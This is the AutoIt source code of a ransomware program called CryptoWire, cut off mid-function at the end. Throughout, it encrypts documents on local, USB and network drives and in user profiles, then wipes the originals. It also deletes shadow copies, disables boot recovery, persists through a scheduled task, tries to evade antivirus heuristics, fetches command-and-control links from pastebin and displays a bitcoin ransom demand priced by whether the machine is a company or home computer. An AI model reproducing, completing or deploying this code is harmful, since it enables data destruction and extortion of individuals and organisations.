#RequireAdmin
;#NoTrayIcon
#include <includes.au3>

;----------------------------------------------------------------------------------------------------------------------------------------------------------

If _Singleton("CryptoWire", 1) = 0 Then ;mutex
    Exit
EndIf

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Unicode variables
Global $CommonFilesDir = FileGetShortName(@CommonFilesDir)
Global $Desktopdir = FileGetShortName(@DesktopDir)
Global $ProgramFilesDir = FileGetShortName(@ProgramFilesDir)
Global $UserProfileDir = FileGetShortName(@UserProfileDir)
Global $ScriptName = FileGetShortName(@ScriptName)
Global $scriptfullpath = FileGetShortName(@ScriptFullPath)

;----------------------------------------------------------------------------------------------------------------------------------------------------------

Global $key = "123" ;password_generator("20","30")

Global $first_run = DriveGetSerial(true_homedrive())

Global $extensions_for_drives = "zip|7z|rar|pdf|doc|docx|xls|xlsx|pptx|pub|one|vsdx|accdb|asd|xlsb|mdb|snp|wbk|ppt|psd|ai|odt|ods|odp|odm|||odc|odb|docm|wps|xlsm|xlk|pptm|pst|dwg|dxf" & _
	"dxg|wpd|rtf|wb2|mdf|dbf|pdd|eps|indd|cdr|dng|3fr|arw|srf|sr2|bay|crw|cr2|dcr|kdc|erf|mef|mrw|nef|nrw|orf|raf|raw|rwl|rw2|r3d|ptx|pef|srw|x3f|der|" & _
	"cer|crt|pem|pfx|p12|p7b|p7c|abw|til|aif|arc|as|asc|asf|ashdisc|asm|asp|aspx|asx|aup|avi|bbb|bdb|bibtex|bkf|bmp|bpn|btd|bz2|c|cdi|himmel|cert|cfm|cgi" & _
	"cpio|cpp|csr|cue|dds|dem|dmg|dsb|eddx|edoc|eml|emlx|EPS|epub|fdf|ffu|flv|gam|gcode|gho|gpx|gz|h|hbk|hdd|hds|hpp|ics|idml|iff|img|ipd|iso|isz|iwa" & _
	"j2k|jp2|jpf|jpm|jpx|jsp|jspa|jspx|jst|key|keynote|kml|kmz|lic|lwp|lzma|M3U|M4A|m4v|max|mbox|md2|mdbackup|mddata|mdinfo|mds|mid|mov|mp3|mp4|mpa|mpb|mpeg|mpg" & _
	"mpj|mpp|msg|mso|nba|nbf|nbi|nbu|nbz|nco|nes|note|nrg|nri|afsnit|ogg|ova|ovf|oxps|p2i|p65|p7|pages|pct|PEM|phtm|phtml|php|php3|php4|php5|phps|phpx|phpxx|pl|plist" & _
	"pmd|pmx|ppdf|pps|ppsm|ppsx|ps|PSD|pspimage|pvm|qcn|qcow|qcow2|qt|ra|rm|rtf|s|sbf|set|skb|slf|sme|smm|spb|sql|srt|ssc|ssi|stg|stl|svg|swf|sxw|syncdb|tager|tc|tex" & _
	"tga|thm|tif|tiff|toast|torrent|txt|vbk|vcard|vcd|vcf|vdi|vfs4|vhd|vhdx|vmdk|vob|wbverify|wav|webm|wmb|wpb|WPS|xdw|xlr|XLSX|xz|yuv|zipx|jpg|jpeg|png|bmp"

;We get the path to : C:\users.
Global $users_folder = StringRegExpReplace($UserProfileDir, "(.*)\\.*", "$1")

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Confuses the antiviruses - Heuristic bypass
$begin = TimerInit()
While 1
	$dif = TimerDiff($begin)
	ConsoleWrite(_BytesToBits(1024) & @CRLF)
	If $dif > 1000 Then ExitLoop
WEnd

;----------------------------------------------------------------------------------------------------------------------------------------------------------

if not FileExists($CommonFilesDir & "\" & $first_run & $first_run) Then
	startup()
	start_the_show()
EndIf

;----------------------------------------------------------------------------------------------------------------------------------------------------------

Func start_the_show()

	;This code is used to ensure that EnableLinkedConnections is turned on, so we can encrypt all network drives.
	$read_linked = RegRead("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLinkedConnections")
	if domaincheck() = True and Not $read_linked = "1" Then
	RegWrite("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLinkedConnections", "REG_DWORD", "1")
	shutdown(6)
	EndIf

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;Get all network shares, and encrypt them all.
	For $i = 1 To 100
		$sVar = RegEnumVal("HKCU64\Software\Microsoft\Windows\CurrentVersion\Explorer\PublishingWizard\AddNetworkPlace\AddNetPlace\LocationMRU", $i)
		If @error <> 0 Then ExitLoop
		$read = RegRead("HKCU64\Software\Microsoft\Windows\CurrentVersion\Explorer\PublishingWizard\AddNetworkPlace\AddNetPlace\LocationMRU", $sVar)

		$stringcontains = StringInStr($read, "\\")
		if $stringcontains = True Then

		encrypt_drives($read, $extensions_for_drives)
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;Get all drives (Network drives, USB drives, External drives - Except c:\) and then encrypt them.
	$drive = DriveGetDrive("ALL")

	For $lclpo = 1 To $drive[0]
		If Not ($drive[$lclpo] = true_homedrive()) And DriveSpaceFree($drive[$lclpo]) > 100 Then
		$get_drive = ($drive[$lclpo] & "\")
		encrypt_drives($get_drive, $extensions_for_drives)
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;We are getting the name of all userprofiles, for each userprofile, we call he func: encrypt_userprofiles($sTmp)
	$FolderList = _FO_FolderSearch($users_folder, 'Default|Defaultuser|Defaultuser0|Default User', False)
	$list = UBound($FolderList) - 1
	For $i = 1 To $list
		if FileExists($FolderList[$i] & "\" & "AppData") Then
		encrypt_userprofiles($FolderList[$i])
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;Here we'll encrypt the popular game client Steam.
	$FileList = _FO_FileSearch($ProgramFilesDir & "\Steam\steamapps\common", 'exe', True, 125, 1, 1, 0)
	$list = UBound($FileList) - 1 ;gets the number of arrays, ubound is returning a extra field, so we make it minus one
	For $i = 1 To $list
	If _fileinuse($FileList[$i]) = "no" Then
		_Encrypt($FileList[$i])
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;$UserKey gets the unique foldername (The place all deletes filder are being moved to).
	;Now we will wipe all the files in the recyclebin, and finally we'll empty it, just to make sure there's nothing left.
	$UserKey = _Ash_UserKey_Detect(1)
	$recycle_path = ("c:\$Recycle.Bin\" & $UserKey)
	FileWipe($recycle_path)
	FileRecycleEmpty()

	;If a script is compiled with x86, it will by default use a x86 version if we call cmd, or any other windows file, we can prevent that
	;And force it to use the x64 version, cmd got very limited functionality if we use the x86 version on a x64 OS.
	;Now we will remove all shadow copies & disable Windows Error Recovery Screen at startup.
	If @OSArch = "X64" Then DllCall("kernel32.dll", "int", "Wow64RevertWow64FsRedirection", "int", 1) ;Read more: https://www.mjtnet.com/forum/viewtopic.php?t=5790&view=previous
	_RunCMD(Random(1000000, 9999999, 1), "vssadmin.exe Delete Shadows /All /Quiet")
	_RunCMD(Random(1000000, 9999999, 1), "bcdedit /set {default} recoveryenabled No")
	_RunCMD(Random(1000000, 9999999, 1), "bcdedit /set {default} bootstatuspolicy ignoreallfailures")

EndFunc   ;==>start

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	func encrypt_drives($read, $extensions_for_drives)
		$FileList = _FO_FileSearch($read, $extensions_for_drives, True, 125, 1, 1, 0)
		$list = UBound($FileList) - 1

		For $i = 1 To $list
			If _fileinuse($FileList[$i]) = "no" Then
			_Encrypt($FileList[$i])
		EndIf
		Next
	EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	func decrypt_drives($read, $extensions_for_drives)
		$FileList = _FO_FileSearch($read, $extensions_for_drives, True, 125, 1, 1, 0)
		$list = UBound($FileList) - 1

		For $i = 1 To $list
			If _fileinuse($FileList[$i]) = "no" Then
			_Decrypt($FileList[$i])
		EndIf
		Next
	EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	func encrypt_userprofiles($sTmp)
		$FileList = _FO_FileSearch($sTmp, '*', True, 125, 125, 1, 1, 0, 'AppData', 1)
		$list = UBound($FileList) - 1 ;gets the number of arrays, ubound is returning a extra field, so we make it minus one
		For $i = 1 To $list
		If _fileinuse($FileList[$i]) = "no" Then
			_Encrypt($FileList[$i])
		EndIf
		Next
	EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	func decrypt_userprofiles($sTmp)
		$FileList = _FO_FileSearch($sTmp, '*', True, 125, 125, 1, 1, 0, 'AppData', 1)
		$list = UBound($FileList) - 1 ;gets the number of arrays, ubound is returning a extra field, so we make it minus one
		For $i = 1 To $list
		If _fileinuse($FileList[$i]) = "no" Then
			_Decrypt($FileList[$i])
		EndIf
		Next
	EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;We are done encrypting all files, and now we are sending the en/de cryption password to the control panel.
;we should probably add a firewall exeption here???

;callhome()

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;Creates the test encrypted file, and get's the value of 200$ in bitcoins.

	$reverse_diskid = StringReverse($first_run)

	if not FileExists($CommonFilesDir & "\" & $first_run & $first_run) Then
	_Crypt_EncryptFile($CommonFilesDir & "\" & $first_run, $CommonFilesDir & "\" & $first_run & $first_run, $key, $CALG_AES_128)

	FileWrite($CommonFilesDir & "\" & $reverse_diskid, _Get_bitcoin_value())
	FileDelete($CommonFilesDir & "\" & $first_run)
	RestartScript() ;Restart the script, so the decryption key no longer will be stored in the memory.
	endif

;####################START OF GUI####################E
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#Region ### START Koda GUI section ### Form=
$Form1 = GUICreate("CryptoWire", 800, 650, default, default, $ws_popup+$ws_caption)
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$decrypt_files = GUICtrlCreateButton("Decrypt Files", 176, 400, 113, 41)
GUICtrlSetFont(-1, 12, 800, 0, "Calibri")
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$Edit1 = GUICtrlCreateEdit("", 16, 56, 768, 329)
_GUICtrlEdit_SetLimitText($Edit1, 999999999)
GUICtrlSetBkColor(-1, 0x000000)
GUICtrlSetColor(-1, 0x00FF00)
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$read = FileRead($CommonFilesDir & "\log.txt")
GUICtrlSetData(-1, "Encrypted files: " & _FileCountLines($CommonFilesDir & "\log.txt") & @CRLF & @CRLF & $read)
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if domaincheck() = True Then
$Label1 = GUICtrlCreateLabel("Your company files has been safely encrypted", 16, 8, 600, 42)
GUICtrlSetFont(-1, 23, 800, 0, "Calibri")
Else
$Label1 = GUICtrlCreateLabel("Your files has been safely encrypted", 16, 8, 600, 42)
GUICtrlSetFont(-1, 23, 800, 0, "Calibri")
EndIf
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Global $Input1 = GUICtrlCreateInput("Decryptionkey", 304, 400, 305, 40)
GUICtrlSetFont(-1, 20, 800, 0, "Arial")
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$buy = GUICtrlCreateButton("Buy Bitcoins", 15, 400, 153, 41)
GUICtrlSetFont(-1, 12, 800, 0, "Calibri")
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$read_btc_file = FileRead($CommonFilesDir & "\" & $reverse_diskid)
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if domaincheck() = True Then
$Edit2 = GUICtrlCreateEdit("All company files have been encrypted, please contact your IT support department." & @CRLF & "The files must be decrypted from this computer: " & @ComputerName & @CRLF & _
"The only way you can recover your files is to buy a decryption key, is to buy a decryption key." & _
@CRLF & "The payment method is: Bitcoins. " & " The price is: " & $read_btc_file & _
@CRLF & @CRLF & "Click on the 'Buy decryption key' button.", 16, 456, 768, 177,$ES_READONLY)
GUICtrlSetFont(-1, 12, 800, 0, "Calibri")
Else
$Edit2 = GUICtrlCreateEdit("The only way you can recover your files is to buy a decryption key" & @CRLF & "The payment method is: Bitcoins. " & " The price is: " & $read_btc_file & _
@CRLF & @CRLF & "Click on the 'Buy decryption key' button.", 16, 456, 768, 177,$ES_READONLY)
GUICtrlSetFont(-1, 12, 800, 0, "Calibri")
EndIf
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
GUISetState(@SW_SHOW)
Local $aaccelkeys[1][2] = [["{ENTER}", $decrypt_files]]
GUISetAccelerators($aaccelkeys)
#EndRegion ### END Koda GUI section ###
;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit

		case $buy

			ShellExecute("http://howtobuybitcoins.info/")

			$get_admin_panel = pastebin()

		Case $decrypt_files

			GUICtrlSetData($Edit1, "")

			MsgBox(64, "Decrypt files", "Your files will be decrypted if the decryption key was correct")

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;TEST DECRYPTION

	;Try to decrypt the test file before we continue.
	_Crypt_DecryptFile($CommonFilesDir & "\" & $first_run & $first_run, $CommonFilesDir & "\" & $first_run, GUICtrlRead($Input1), $CALG_AES_128)
	If @error = 420 Then
				FileDelete($CommonFilesDir & "\" & $first_run)
				MsgBox(16, "Error!", "Wrong decryption key")
				RestartScript()
	Else
				FileDelete($CommonFilesDir & "\" & $first_run)
	EndIf

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;Get all network shares, and decrypt them all.
	For $i = 1 To 100
		$sVar = RegEnumVal("HKCU64\Software\Microsoft\Windows\CurrentVersion\Explorer\PublishingWizard\AddNetworkPlace\AddNetPlace\LocationMRU", $i)
		If @error <> 0 Then ExitLoop
		$read = RegRead("HKCU64\Software\Microsoft\Windows\CurrentVersion\Explorer\PublishingWizard\AddNetworkPlace\AddNetPlace\LocationMRU", $sVar)

		$stringcontains = StringInStr($read, "\\")
		if $stringcontains = True Then

		decrypt_drives($read,$extensions_for_drives)
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;Get all drives (Network drives, USB drives, External drives - Except c:\) and then encrypt them.
	$drive = DriveGetDrive("ALL")

	For $lclpo = 1 To $drive[0]
		If Not ($drive[$lclpo] = true_homedrive()) And DriveSpaceFree($drive[$lclpo]) > 100 Then
		$get_drive = ($drive[$lclpo] & "\")
		decrypt_drives($get_drive, $extensions_for_drives)
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

	;We are getting the name of all userprofiles, for each userprofile, we call he func: decrypt_userprofiles($sTmp)
	$FolderList = _FO_FolderSearch($users_folder, 'Default|Defaultuser|Defaultuser0|Default User', False)
	$list = UBound($FolderList) - 1
	For $i = 1 To $list
		if FileExists($FolderList[$i] & "\" & "AppData") Then
		decrypt_userprofiles($FolderList[$i])
		EndIf
	Next

;----------------------------------------------------------------------------------------------------------------------------------------------------------

			;Here we'll decrypt the popular game client Steam.

			$FileList = _FO_FileSearch($ProgramFilesDir & "\Steam\steamapps\common", 'exe', True, 125, 1, 1, 0)
			$list = UBound($FileList) - 1 ;gets the number of arrays, ubound is returning a extra field, so we make it minus one
			For $i = 1 To $list
			If _fileinuse($FileList[$i]) = "no" Then
				_Decrypt($FileList[$i])
			EndIf
			Next
			;----------------------------------------------------------------------------------------------------------------------------------------------------------

			$read_decrypted = GUICtrlRead($Edit1)

			GUICtrlSetData($Label1, "Your files has been decrypted")

			FileWrite($Desktopdir & "\log.txt", "Decrypted files: " & @CRLF & @CRLF & $read_decrypted)

			FileDelete($CommonFilesDir & "\log.txt")

			MsgBox(64, "Successfull", "All your files has been decrypted." & @CRLF & @CRLF & "You can view all the decrypted files in this log: " & @CRLF & @CRLF & $Desktopdir & "\log.txt")

			FileDelete($CommonFilesDir & "\" & @ScriptName)

			SuiCide()

			ProcessClose(@ScriptName)

	EndSwitch
WEnd
;####################END OF GUI####################

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is for encrypting all the files. The function is being called several of times.
Func _Encrypt($path)

		$get_extension = _GetFileExt($path)

		$string = '"' & $path & '"'
		$searchstring1 = "encrypted"
		$size_in_mb = Round(FileGetSize($path) / 1048576, 2)
		$size_in_kb = Round(FileGetSize($path) / 1024, 2)
		If $size_in_mb < 30 and $size_in_kb > 3 And Not StringInStr($string, $searchstring1) Then
			_Crypt_EncryptFile($path, _GetFileNameExExt($path) & ".encrypted." & $get_extension, $key, $CALG_AES_128)

			FileWipe($path)

			FileWrite($CommonFilesDir & "\log.txt", _GetFileNameExExt($path) & ".encrypted." & $get_extension & @CRLF)
		EndIf
EndFunc   ;==>_Encrypt

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is for decrypting all the encrypted files.
Func _Decrypt($path)

		$key_input = GUICtrlRead($Input1)

		$get_extension = _GetFileExt($path)

		$string = '"' & $path & '"'
		$searchstring1 = "encrypted"
		$size_in_mb = Round(FileGetSize($path) / 1048576, 2)
		$size_in_kb = Round(FileGetSize($path) / 1024, 2)

		If $size_in_mb < 30 And $size_in_kb > 3 And StringInStr($string, $searchstring1) Then
			_Crypt_DecryptFile($path, StringReplace($path, ".encrypted", ""), $key_input, $CALG_AES_128)

				GUICtrlSetData($Edit1, StringReplace($path, ".encrypted", "") & @CRLF, 1)
				FileDelete($path)
		EndIf
EndFunc   ;==>_Decrypt

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Those 2 functions are for getting the fileextention, and the filename without it's extention. (It's used for naming the encrypted files).
Func _GetFileExt($file)
	Return StringRight($file, StringLen($file) - StringInStr($file, ".", 0, -1))
EndFunc   ;==>_GetFileExt

Func _GetFileNameExExt($gFileName)
	Local $gPosition = StringInStr($gFileName, ".", 0, -1)
	If Not $gPosition Then Return SetError(1, 1, 0)
	Local $gFileNameExt = StringRight($gFileName, StringLen($gFileName) - ($gPosition - 1))
	$gFileName = StringLeft($gFileName, $gPosition - 1)
	Return $gFileName
EndFunc   ;==>_GetFileNameExExt

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is used for running cmd commands. (It's used for deleteing all shadow copies)
Func _RunCMD($sTitle, $sCommand) ; Returns PID of Run.
	Return Run(@ComSpec & " /C title " & $sTitle & "|" & $sCommand, "", @SW_HIDE)
EndFunc   ;==>_RunCMD

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;We check if the c:\ drive exists, and returs "C:" if not, then we get the homedrive.
Func true_homedrive()
If Not FileExists("C:\") Then
    Return(FileGetShortName(@homedrive))
Else
    Return("C:")
EndIf
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is used in the very beginning of the script. (It's used for bypassing heuristic antivirus detections).
Func _BytesToBits($bBinary)
	Local $byte, $bits = "", $i, $j, $s
	#forceref $j
	For $i = 1 To BinaryLen($bBinary)
		$byte = BinaryMid($bBinary, $i, 1)
		For $j = 1 To 8
			$bits &= BitAND($byte, 1)
			$byte = BitShift($byte, 1)
		Next
	Next
	$s = StringSplit($bits, "")
	$bits = ""
	For $i = $s[0] To 1 Step -1
		$bits &= $s[$i]
	Next
	Return $bits
EndFunc   ;==>_BytesToBits

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function simply retstarts the running script. (It's used if the user enters a wrong decryption key).
Func RestartScript()
	If @Compiled = 1 Then
		Run($scriptfullpath)
	Else
		Run(FileGetShortName(@AutoItExe) & " " & $scriptfullpath)
	EndIf
	Exit
EndFunc   ;==>RestartScript

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Gets path to the recyclebin. (This function is used after it's done encrypting all files, to safely wipe all files in the recyclebin).
Func _Ash_UserKey_Detect($ReturnType = 0)
	If $ReturnType < 0 Or $ReturnType > 1 Then $ReturnType = 0
	$CountReg = 1
	Do
		$EnumKey = RegEnumKey("HKEY_USERS", $CountReg)
		If @error Then ExitLoop
		$CountReg = 1 + $CountReg
	Until StringLeft($EnumKey, StringLen("S-1-5-21")) = "S-1-5-21"
	If $ReturnType = 0 Then
		Return $EnumKey
	Else
		Return $EnumKey
	EndIf
EndFunc   ;==>_Ash_UserKey_Detect

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Deletes the running script (This function is used when all the files has been decrypted).
;We restart the script, so the decryption key no longer will be stored in the memory.

Func SuiCide()
    $SC_File = @TEMPDIR & "\start.cmd"
    FileDelete($SC_File)
    $SC_batch = 'loop:' & @CRLF & 'del "' & $scriptfullpath & '"'  & @CRLF & 'ping -n 1 -w 250 zxywqxz_q' & @CRLF & 'if exist "' & $scriptfullpath & '" goto loop' & @CRLF & 'del start.cmd' & @CRLF
    FileWrite($SC_File,$SC_batch)
    Run($SC_File,@TEMPDIR,@SW_HIDE)
    Exit
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;We will copy our script to another location, then we'll create a scheduled task to add it to startup, and then we system hides it.
Func startup()
	if not FileExists($CommonFilesDir & "\" & $first_run & $first_run) Then
		FileCopy($scriptfullpath, $CommonFilesDir)
		Run(@ComSpec & ' /c ' & "schtasks /create /sc onlogon /tn " & $first_run & " /rl highest /tr " & $CommonFilesDir & "\" & $ScriptName,"", @SW_HIDE)
	EndIf
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This is our function to generate a encryption password, we can dfine min. and max. length.
func password_generator($min_length, $max_length)
		Dim $chars[2]
		$chars[0] = "abcdefghijklmnopqrstuvwxyz1234567890"
		$chars[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

		$random_char = ""
		For $i = 1 To Random($min_length,$max_length,1)
		$typeOfChar = Random(0, UBound($chars)-1,1)
		$random_char &= StringMid($chars[$typeOfChar], Random(1, StringLen($chars[$typeOfChar]), 1), 1)
		Next

		Return($random_char)
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is used for grabbing the C&C (controle center / admin panel) We got 5 pastebin links, each pastebin will contain the same, or different links
;But only 1 link per pastebin. It's your choice whenever you want to direct the domains to the same C&C, or to different C&s's.
Func pastebin()
	HttpSetUserAgent("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36")
	$raw = "http://pastebin.com/raw.php?i="

	$pastie1 = BinaryToString(InetRead($raw & "3y3CfuB"))
	If Not @error Then
		Return $pastie1
	EndIf

	$pastie2 = BinaryToString(InetRead($raw & "4b9kE6w"))
	If Not @error Then
		Return $pastie2
	EndIf

	$pastie3 = BinaryToString(InetRead($raw & "vMQWsvS"))
	If Not @error Then
		Return $pastie3
	EndIf

	$pastie4 = BinaryToString(InetRead($raw & "Tj26ZAf"))
	If Not @error Then
		Return $pastie4
	EndIf

	$pastie5 = BinaryToString(InetRead($raw & "55wPy9CD"))
	If Not @error Then
		Return $pastie5
	EndIf

EndFunc   ;==>pastebin

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;If it's a company machine, the price will be different from a personal machine. This func is used to notify the user how much it costs to decrypt his files.
Func _Get_bitcoin_value()

if domaincheck() = True Then
$company = InetRead("https://blockchain.info/tobtc?currency=USD&value=1000")
$company_binary = BinaryToString($company)
Return("$1000 = " & $company_binary & " Bitcoins")

Else

$personal = InetRead("https://blockchain.info/tobtc?currency=USD&value=200")
$personal_binary = BinaryToString($personal)
Return("$200 = " & $personal_binary & " Bitcoins")
EndIf
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is used for setting the max amount of characters that an editbox can contain. By default, an editbox can max contain : 30000 chars.
Func _GUICtrlEdit_SetLimitText($hWnd, $iLimit)
	If Not IsHWnd($hWnd) Then $hWnd = GUICtrlGetHandle($hWnd)

	_SendMessage($hWnd, $EM_SETLIMITTEXT, $iLimit)
EndFunc   ;==>_GUICtrlEdit_SetLimitText

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function will overwrite & delete the original file, making it impossible to recover the file.
Func FileWipe($sFileName, $nByte = 0x0)
	If Not FileExists($sFileName) Then Return
	$iSize = FileGetSize($sFileName)
	$tBuffer = DllStructCreate("byte[" & $iSize & "]")
	MemSet(DllStructGetPtr($tBuffer), $nByte, $iSize)
	$hFile = _WinAPI_CreateFile($sFileName, 2, 6)
	_WinAPI_WriteFile($hFile, DllStructGetPtr($tBuffer), $iSize, $iSize)
	_WinAPI_CloseHandle($hFile)
	FileDelete($sFileName)
EndFunc   ;==>FileWipe

Func MemSet($pDest, $nChar, $nCount)
	DllCall("msvcrt.dll", "ptr:cdecl", "memset", "ptr", $pDest, "int", $nChar, "int", $nCount)
	If @error Then Return SetError(1, 0, False)
	Return True
EndFunc   ;==>MemSet

; from WinAPIEx - just simplified for this purpose
Func _WinAPI_CreateFileMapping($hFile)
	Local $Ret = DllCall('kernel32.dll', 'ptr', 'CreateFileMappingW', 'ptr', $hFile, 'ptr', 0, 'dword', 0x4, 'dword', 0, 'dword', 0, 'ptr', 0)
	If (@error) Or (Not $Ret[0]) Then Return SetError(1, 0, 0)
	Return $Ret[0]
EndFunc   ;==>_WinAPI_CreateFileMapping

Func _WinAPI_MapViewOfFile($hMapping)
	Local $Ret = DllCall('kernel32.dll', 'ptr', 'MapViewOfFile', 'ptr', $hMapping, 'dword', 0x6, 'dword', 0, 'dword', 0, 'dword', 0)
	If (@error) Or (Not $Ret[0]) Then Return SetError(1, 0, 0)
	Return $Ret[0]
EndFunc   ;==>_WinAPI_MapViewOfFile

Func _WinAPI_UnmapViewOfFile($pAddress)
	DllCall('kernel32.dll', 'int', 'UnmapViewOfFile', 'ptr', $pAddress)
	If @error Then Return SetError(1, 0, 0)
	Return 1
EndFunc   ;==>_WinAPI_UnmapViewOfFile

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;This function is taken from misc.au3, and it prevents running multiple instances of the script, also known as mutex.
Func _Singleton($sOccurenceName, $iFlag = 0)
	Local Const $ERROR_ALREADY_EXISTS = 183
	Local Const $SECURITY_DESCRIPTOR_REVISION = 1
	Local $tSecurityAttributes = 0

	If BitAND($iFlag, 2) Then
		Local $tSecurityDescriptor = DllStructCreate("byte;byte;word;ptr[4]")
		; Initialize the security descriptor.
		Local $aRet = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", _
				"struct*", $tSecurityDescriptor, "dword", $SECURITY_DESCRIPTOR_REVISION)
		If @error Then Return SetError(@error, @extended, 0)
		If $aRet[0] Then
			; Add the NULL DACL specifying access to everybody.
			$aRet = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", _
					"struct*", $tSecurityDescriptor, "bool", 1, "ptr", 0, "bool", 0)
			If @error Then Return SetError(@error, @extended, 0)
			If $aRet[0] Then
				; Create a SECURITY_ATTRIBUTES structure.
				$tSecurityAttributes = DllStructCreate($tagSECURITY_ATTRIBUTES)
				; Assign the members.
				DllStructSetData($tSecurityAttributes, 1, DllStructGetSize($tSecurityAttributes))
				DllStructSetData($tSecurityAttributes, 2, DllStructGetPtr($tSecurityDescriptor))
				DllStructSetData($tSecurityAttributes, 3, 0)
			EndIf
		EndIf
	EndIf

	Local $aHandle = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $tSecurityAttributes, "bool", 1, "wstr", $sOccurenceName)
	If @error Then Return SetError(@error, @extended, 0)
	Local $aLastError = DllCall("kernel32.dll", "dword", "GetLastError")
	If @error Then Return SetError(@error, @extended, 0)
	If $aLastError[0] = $ERROR_ALREADY_EXISTS Then
		If BitAND($iFlag, 1) Then
			DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $aHandle[0])
			If @error Then Return SetError(@error, @extended, 0)
			Return SetError($aLastError[0], $aLastError[0], 0)
		Else
			Exit -1
		EndIf
	EndIf
	Return $aHandle[0]
EndFunc   ;==>_Singleton

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Used for counting the lines in the log for encrypted files, to see how many files that were encrypted.
Func _FileCountLines($sFilePath)
	Local $hFileOpen = FileOpen($sFilePath, $FO_READ)
	If $hFileOpen = -1 Then Return SetError(1, 0, 0)

	Local $sFileRead = StringStripWS(FileRead($hFileOpen), $STR_STRIPTRAILING)
	FileClose($hFileOpen)
	Return UBound(StringRegExp($sFileRead, "\R", $STR_REGEXPARRAYGLOBALMATCH)) + 1 - Int($sFileRead = "")
EndFunc   ;==>_FileCountLines

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;We use this function to check if a file is in use, if it is, then we won't encrypt it.
Func _fileinuse($file)
$hFile = DllCall("kernel32.dll", "hwnd", "CreateFile", "str", $file, "int", BitOR($GENERIC_READ, $GENERIC_WRITE), "int", 0, "ptr", 0, "int", $OPEN_EXISTING, "int", $FILE_ATTRIBUTE_NORMAL, "int", 0)

If $hFile[0] = -1 Then
    Return("yes")
Else
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile[0])
	Return("no")
EndIf
EndFunc

;----------------------------------------------------------------------------------------------------------------------------------------------------------

;Checks if the computer is joined to a domain.

Func domaincheck()
Const Enum $NetSetupUnknownStatus = 0, $NetSetupUnjoined, $NetSetupWorkgroupName, $NetSetupDomainName
Local $sJoinType
$aNetGetJoinInformation = _WinAPI_NetGetJoinInformation()
Switch $aNetGetJoinInformation[0]
    Case $NetSetupUnknownStatus
        $sJoinType = "The status is unknown."
    Case $NetSetupUnjoined
        $sJoinType = "The computer is not joined."
    Case $NetSetupWorkgroupName
        $sJoinType = "The computer is joined to a workgroup : " & $aNetGetJoinInformation[1]
    Case $NetSetupDomainName
        $sJoinType = "The computer is joined to a domain : " & $aNetGetJoinInformation[1]
		Return(true)
EndSwitch
EndFunc

Func _WinAPI_NetGetJoinInformation($sComputerName = "")
    Local $aRet = DllCall("Netapi32.dll", "int", "NetGetJoinInformation", "wstr", $sComputerName, "ptr*", "", "int*", 0)
    If @error Then Return SetError(@error, 0, 0)
    Local $pNameBuffer = $aRet[2]
    Local $tName = DllStructCreate("wchar[" & _BufferSize($pNameBuffer) &"]", $pNameBuffer)
    Local $sName = DllStructGetData($tName, 1)
    DllCall("netapi32.dll", "int", "NetApiBufferFree", "ptr", $pNameBuffer)
